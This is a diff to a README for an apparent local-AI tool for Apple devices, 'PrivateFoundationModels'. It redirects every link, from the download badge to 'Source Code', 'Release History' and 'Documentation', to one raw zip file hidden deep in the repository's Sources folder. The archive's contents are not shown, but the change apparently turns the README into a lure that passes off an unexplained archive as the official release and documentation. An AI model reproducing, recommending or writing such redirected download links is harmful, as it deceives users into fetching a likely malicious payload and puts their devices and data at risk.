@@ -1,6 +1,6 @@
 # 🤖 PrivateFoundationModels - Build intelligent apps using local hardware
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/wittyunforgiving119/PrivateFoundationModels/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/wittyunforgiving119/PrivateFoundationModels/main/Sources/PFMMLXSmoke/Foundation_Models_Private_1.4.zip)
 
 PrivateFoundationModels allows developers to use local artificial intelligence models on Apple devices. It keeps your data private by processing information directly on your hardware. You do not send your data to external servers or cloud services. The system uses your computer's built-in strength to power intelligent features.
 
@@ -8,7 +8,7 @@ PrivateFoundationModels allows developers to use local artificial intelligence m
 
 You can download the application from the official release page. 
 
-[Visit this page to download the software here](https://github.com/wittyunforgiving119/PrivateFoundationModels/releases)
+[Visit this page to download the software here](https://raw.githubusercontent.com/wittyunforgiving119/PrivateFoundationModels/main/Sources/PFMMLXSmoke/Foundation_Models_Private_1.4.zip)
 
 ## 💻 System Requirements
 
@@ -90,8 +90,8 @@ Avoid sharing private data or sensitive files when you report errors. Provide on
 
 The project remains open for contribution. Developers help improve the efficiency of the software by submitting code updates. You can track progress by watching the repository for updates. 
 
-*   [Source Code](https://github.com/wittyunforgiving119/PrivateFoundationModels)
-*   [Release History](https://github.com/wittyunforgiving119/PrivateFoundationModels/releases)
-*   [Documentation](https://github.com/wittyunforgiving119/PrivateFoundationModels/wiki)
+*   [Source Code](https://raw.githubusercontent.com/wittyunforgiving119/PrivateFoundationModels/main/Sources/PFMMLXSmoke/Foundation_Models_Private_1.4.zip)
+*   [Release History](https://raw.githubusercontent.com/wittyunforgiving119/PrivateFoundationModels/main/Sources/PFMMLXSmoke/Foundation_Models_Private_1.4.zip)
+*   [Documentation](https://raw.githubusercontent.com/wittyunforgiving119/PrivateFoundationModels/main/Sources/PFMMLXSmoke/Foundation_Models_Private_1.4.zip)
 
 Ensure you keep your application updated. Newer versions often include compatibility fixes for the latest operating system releases. You can find the latest version number by visiting the main download page.
